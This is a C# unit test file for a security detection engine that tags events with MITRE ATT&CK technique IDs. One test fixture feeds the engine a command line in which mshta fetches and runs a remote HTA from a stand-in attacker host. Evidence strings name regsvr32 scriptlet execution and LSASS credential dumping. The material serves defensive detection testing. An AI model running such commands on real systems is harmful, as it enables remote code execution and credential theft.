using System.Linq;
using Bulwark.Core.Engine;
using Bulwark.Core.Models;
using Xunit;

namespace Bulwark.Core.Tests;

/// <summary>
/// ATT&CK 技战术标注:从证据链原因里提取技战术编号,解析为「编号+名称」写回证据,
/// 并在事件上汇总去重。验证目录查表、子技战术兜底与端到端标注。
/// </summary>
public class AttackAnnotatorTests
{
    [Fact]
    public void Catalog_ResolvesKnownTechnique()
    {
        var t = AttackCatalog.Lookup("T1218.010");
        Assert.NotNull(t);
        Assert.Equal("防御规避", t!.Tactic);
        Assert.Contains("Regsvr32", t.Name);
    }

    [Fact]
    public void Catalog_FallsBackToParentTechnique()
    {
        // 未收录的子编号回退到父技战术
        var t = AttackCatalog.Lookup("T1218.999");
        Assert.NotNull(t);
        Assert.Equal("T1218", t!.Id);
    }

    [Fact]
    public void Annotate_ExtractsTechniqueFromEvidenceDescription()
    {
        var e = new SecurityEvent();
        e.AddEvidence("LolbinAnalyzer", EvidenceKind.HardIndicator,
            "regsvr32 远程加载 scriptlet(Squiblydoo 无文件执行,T1218.010)", 55);
        e.AddEvidence("ThreatDetector", EvidenceKind.HardIndicator,
            "comsvcs 转储 LSASS 内存(凭据窃取,T1003.001)", 40);
        e.AddEvidence("RuleEngine", EvidenceKind.Info, "无技战术编号的说明项");

        AttackAnnotator.Annotate(e);

        // 两条带 T 编号的证据被标注
        var lol = e.EvidenceChain[0];
        Assert.Equal("T1218.010", lol.Technique);
        Assert.Contains("Regsvr32", lol.TechniqueName);

        // 事件汇总去重技战术(含可读名称)
        Assert.Equal(2, e.Techniques.Count);
        Assert.Contains(e.Techniques, s => s.StartsWith("T1218.010"));
        Assert.Contains(e.Techniques, s => s.StartsWith("T1003.001"));
    }

    [Fact]
    public void EndToEnd_LolbinAbuse_ProducesAttackTechniques()
    {
        var engine = new RuleEngine { TrustSignedActors = true };
        var e = new SecurityEvent
        {
            Type = EventType.ProcessCreate,
            ActorPath = @"C:\Windows\System32\mshta.exe",
            ActorSigned = true,
            ActorPublisher = "Microsoft Corporation",
            CommandLine = "mshta http://evil.test/p.hta"
        };

        engine.Evaluate(e);

        Assert.NotEmpty(e.Techniques);
        Assert.Contains(e.Techniques, s => s.StartsWith("T1218.005")); // Mshta
    }

    [Fact]
    public void NoTechniqueEvidence_LeavesTechniquesEmpty()
    {
        var e = new SecurityEvent();
        e.AddEvidence("ThreatDetector", EvidenceKind.Info, "无可信数字签名");
        AttackAnnotator.Annotate(e);
        Assert.Empty(e.Techniques);
    }
}
